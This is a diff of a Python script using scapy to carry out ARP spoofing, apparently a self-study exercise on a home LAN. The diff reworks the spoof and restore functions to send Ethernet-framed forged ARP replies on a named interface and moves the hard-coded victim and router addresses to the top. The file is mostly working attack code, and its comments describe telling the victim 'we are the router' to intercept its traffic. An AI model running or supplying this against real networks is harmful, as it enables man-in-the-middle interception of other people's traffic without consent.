@@ -4,6 +4,15 @@ import time
 import scapy.all as scapy
 import subprocess
 
+# IP Forwarding
+# subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
+# subprocess.call(["echo", "0", ">", "/proc/sys/net/ipv4/ip_forward"])
+
+target_ip = "192.168.0.226"
+router_ip = "192.168.0.1"
+interface = "enp0s1"
+
+
 def get_mac(ip):
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")            # Ethernet frame
     arp_request = scapy.ARP(pdst=ip)                            # ARP packet
@@ -17,24 +26,22 @@ def get_mac(ip):
 # psrc  ==> <router IP>
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(packet, verbose=False)
+    ether = scapy.Ether(dst=str(target_mac))
+    arp = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    packet = ether / arp
+    scapy.sendp(packet, iface=interface, verbose=False)
 
 def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
-    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
-    scapy.send(packet, count=4, verbose=False)
-
-
-# IP Forwarding
-subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
+    ether = scapy.Ether(dst=str(destination_mac))
+    arp = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    packet = ether / arp
+    scapy.sendp(packet, iface=interface, count=4, verbose=False)
 
 # we're telling the victim that we are the router,
 # and otherwise we're telling the router that we are the victim
 # it will update the ARP table of the target
-target_ip = "192.168.0.226"
-router_ip = "192.168.0.1"
 packet_count = 0
 try:
     while True:
@@ -47,4 +54,3 @@ except KeyboardInterrupt:
     print("[+] Detected CTRL + C ...... Restoring.")
     restore(router_ip, target_ip)
     restore(target_ip, router_ip)
-    subprocess.call(["echo", "0", ">", "/proc/sys/net/ipv4/ip_forward"])
